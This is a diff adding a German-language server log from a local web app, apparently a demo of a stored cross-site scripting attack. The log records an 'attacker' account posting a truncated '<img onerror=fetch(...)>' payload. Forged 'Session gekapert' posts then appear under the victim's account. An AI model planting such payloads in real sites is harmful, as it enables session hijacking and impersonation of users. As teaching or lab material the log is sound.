@@ -1,0 +1,50 @@
+[2025-06-16T11:26:39.265Z] Server läuft auf http://localhost:3000
+[2025-06-16T11:26:39.265Z] Verbunden mit der SQLite-Datenbank.
+[2025-06-16T11:26:54.484Z] Eingehender Request: GET /login von IP: ::1
+[2025-06-16T11:27:05.547Z] Eingehender Request: POST /login von IP: ::1
+[2025-06-16T11:27:05.547Z]   Body-Daten: {"username":"testuser","password":"testpass"}...
+[2025-06-16T11:27:05.550Z] Benutzer 'testuser' erfolgreich eingeloggt.
+[2025-06-16T11:27:05.560Z] Eingehender Request: GET /dashboard von IP: ::1
+[2025-06-16T11:27:05.561Z] Dashboard für Benutzer 'testuser' aufgerufen.
+[2025-06-16T11:27:11.839Z] Eingehender Request: POST /addpost von IP: ::1
+[2025-06-16T11:27:11.839Z]   Body-Daten: {"content":"Hallo, Welt!"}...
+[2025-06-16T11:27:11.843Z] Post von 'testuser' erfolgreich in DB gespeichert (ID: 41).
+[2025-06-16T11:27:11.850Z] Eingehender Request: GET /dashboard von IP: ::1
+[2025-06-16T11:27:11.851Z] Dashboard für Benutzer 'testuser' aufgerufen.
+[2025-06-16T11:27:52.249Z] Eingehender Request: GET / von IP: ::ffff:10.30.142.94
+[2025-06-16T11:27:58.501Z] Eingehender Request: POST /login von IP: ::ffff:10.30.142.94
+[2025-06-16T11:27:58.501Z]   Body-Daten: {"username":"attacker","password":"attackerpass"}...
+[2025-06-16T11:27:58.502Z] Benutzer 'attacker' erfolgreich eingeloggt.
+[2025-06-16T11:27:58.510Z] Eingehender Request: GET /dashboard von IP: ::ffff:10.30.142.94
+[2025-06-16T11:27:58.510Z] Dashboard für Benutzer 'attacker' aufgerufen.
+[2025-06-16T11:28:27.785Z] Eingehender Request: POST /addpost von IP: ::ffff:10.30.142.94
+[2025-06-16T11:28:27.785Z]   Body-Daten: {"content":"Weiß jemand, warum ich keine Bilder posten kann? :( <img src=x onerror=\"fetch('http://1...
+[2025-06-16T11:28:27.789Z] Post von 'attacker' erfolgreich in DB gespeichert (ID: 42).
+[2025-06-16T11:28:27.797Z] Eingehender Request: GET /dashboard von IP: ::ffff:10.30.142.94
+[2025-06-16T11:28:27.797Z] Dashboard für Benutzer 'attacker' aufgerufen.
+[2025-06-16T11:28:27.821Z] Eingehender Request: GET /x von IP: ::ffff:10.30.142.94
+[2025-06-16T11:28:27.847Z] Eingehender Request: POST /addpost von IP: ::ffff:10.30.142.94
+[2025-06-16T11:28:27.847Z]   Body-Daten: {"content":"🚨 ACHTUNG: Session gekapert! Dieser Post wurde von einem Angreifer im Namen des Opfers ...
+[2025-06-16T11:28:27.851Z] Post von 'attacker' erfolgreich in DB gespeichert (ID: 43).
+[2025-06-16T11:28:27.863Z] Eingehender Request: GET /dashboard von IP: ::ffff:10.30.142.94
+[2025-06-16T11:28:27.864Z] Dashboard für Benutzer 'attacker' aufgerufen.
+[2025-06-16T11:28:41.227Z] Eingehender Request: GET /dashboard von IP: ::1
+[2025-06-16T11:28:41.227Z] Dashboard für Benutzer 'testuser' aufgerufen.
+[2025-06-16T11:28:41.236Z] Eingehender Request: GET /x von IP: ::1
+[2025-06-16T11:28:41.256Z] Eingehender Request: POST /addpost von IP: ::ffff:10.30.142.94
+[2025-06-16T11:28:41.256Z]   Body-Daten: {"content":"🚨 ACHTUNG: Session gekapert! Dieser Post wurde von einem Angreifer im Namen des Opfers ...
+[2025-06-16T11:28:41.258Z] Post von 'testuser' erfolgreich in DB gespeichert (ID: 44).
+[2025-06-16T11:28:41.266Z] Eingehender Request: GET /dashboard von IP: ::ffff:10.30.142.94
+[2025-06-16T11:28:41.267Z] Dashboard für Benutzer 'testuser' aufgerufen.
+[2025-06-16T11:28:49.825Z] Eingehender Request: GET /dashboard von IP: ::1
+[2025-06-16T11:28:49.826Z] Dashboard für Benutzer 'testuser' aufgerufen.
+[2025-06-16T11:28:49.835Z] Eingehender Request: GET /x von IP: ::1
+[2025-06-16T11:28:49.853Z] Eingehender Request: POST /addpost von IP: ::ffff:10.30.142.94
+[2025-06-16T11:28:49.854Z]   Body-Daten: {"content":"🚨 ACHTUNG: Session gekapert! Dieser Post wurde von einem Angreifer im Namen des Opfers ...
+[2025-06-16T11:28:49.855Z] Post von 'testuser' erfolgreich in DB gespeichert (ID: 45).
+[2025-06-16T11:28:49.863Z] Eingehender Request: GET /dashboard von IP: ::ffff:10.30.142.94
+[2025-06-16T11:28:49.863Z] Dashboard für Benutzer 'testuser' aufgerufen.
+[2025-06-17T13:44:45.859Z] Eingehender Request: GET /x von IP: ::1
+[2025-06-19T10:48:04.567Z] Eingehender Request: GET /dashboard von IP: ::1
+[2025-06-19T10:48:04.577Z] Eingehender Request: GET /login von IP: ::1
+[2025-06-19T10:48:04.610Z] Eingehender Request: GET /favicon.ico von IP: ::1
